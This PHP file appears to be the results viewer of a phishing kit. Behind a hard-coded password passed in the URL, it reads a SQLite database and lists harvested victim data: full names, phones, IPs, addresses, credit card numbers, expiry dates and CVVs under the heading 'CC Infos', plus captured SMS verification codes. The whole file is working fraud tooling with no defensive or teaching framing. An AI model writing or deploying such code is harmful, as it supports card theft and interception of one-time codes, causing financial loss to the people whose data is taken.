<?php
if (isset($_GET['password']) and $_GET['password']=="A635B1D07883F754FC897F10732BADA8" )
  {

     class MyDB extends SQLite3 {
      function __construct() {
         $this->open('../data.db');
      }
   }
   
   $db = new MyDB();
   if(!$db) {
      echo $db->lastErrorMsg();
   } else {
   }

   $sql =<<<EOF
      SELECT * from COMPANY ORDER BY ID DESC;
EOF;

   $ret = $db->query($sql);


   while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {

if ($row['Number']!="")

{


      echo "<strong><u>CC Infos</u> </strong>". "<br>";
      echo "Nomcomplet = ". $row['Nomcomplet'] ."<br>";
      echo "Telephone = ". $row['Tel'] ."<br>";
      echo "ip = ". $row['IP'] ."<br>";
      echo "Adresse = ". $row['Adresse'] ."<br>";
      echo "ZIP = ".$row['ZIP'] ."<br>";
      echo "Number = ".$row['Number'] ."<br>";
      echo "MM = ".$row['MM'] ."<br>";
      echo "AA = ".$row['AA'] ."<br>";
      echo "CVV = ".$row['CVV'] ."<br>";
      echo "datee = ".$row['datee'] ."<br>";
      echo "timee = ".$row['timee'] ."<br>";
     
      echo "======================================="."<br><br>";
}
else
{
    echo "IP = ".$row['IP'] ."<br>";
    echo "SMSCODE = ".$row['smscode'] ."<br>";
    echo "datee = ".$row['datee'] ."<br>";
      echo "timee = ".$row['timee'] ."<br>";
     echo "======================================="."<br><br>";
}

   }

   $db->close();
  }
?>